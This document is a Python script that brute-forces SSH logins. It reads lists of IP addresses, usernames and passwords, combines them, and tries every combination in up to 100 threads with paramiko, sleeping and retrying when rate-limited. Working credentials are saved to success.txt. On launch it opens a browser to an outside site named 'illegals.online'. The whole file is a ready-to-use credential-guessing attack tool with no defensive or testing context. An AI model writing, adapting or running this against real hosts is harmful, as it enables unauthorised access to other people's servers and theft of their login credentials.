# initialize colorama
import paramiko
import socket
import time
from colorama import init, Fore
import threading
from tkinter import filedialog as fd
import webbrowser

webbrowser.open('https://illegals.online')
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE


def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
       
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        ax2 = open("success.txt","a")
        ax2.write(f"[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
        ax2.close()
        return True

def başlatıcı():
    print(f"{RED} Import IPs")
    ips = fd.askopenfilename()
    ips = open(ips, encoding='utf8', errors = 'ignore').readlines()
    print(f"{RED} Import Usernames")
    usernames = fd.askopenfilename()
    usernames = open(usernames, encoding='utf8', errors = 'ignore').readlines()
    print(f"{RED} Import Passwords")
    passwords = fd.askopenfilename()
    passwords = open(passwords, encoding='utf8', errors = 'ignore').readlines()
    a = []
    for i in ips:
        for i2 in usernames:
            for i3 in passwords:
                x = i2+"@"+i+":"+i3
                a.append(x.replace("\n","")+"\n")
    nan = ""
    for al in a: 
        nan += al
    ax = open("combo.txt","w")
    ax.write(nan)
    ax.close()
    num=int('0')
    combos = open("combo.txt","r").readlines()
    print(combos)
    User = []
    Pass = []
    IPx = []
    for y in combos:
            ez = y.replace("\n", "").split("@")
            ezX = y.replace("\n", "").split(":")
            try:
                User.append(ez[0])
                IPx.append(ezX[0].split("@")[1])
                Pass.append(ezX[1])
            except:
                pass
    print(User)
    threadsnum = 100
    while True:
        if threading.active_count() < int(threadsnum):
                if len(User) > num:

                    threading.Thread(target=is_ssh_open, args=(IPx[num],User[num], Pass[num])).start()
                    num += 1
                 
                else:
                    
                    exit()
                    time.sleep(0.6)
                    
        else:
           
            time.sleep(0.3)
başlatıcı()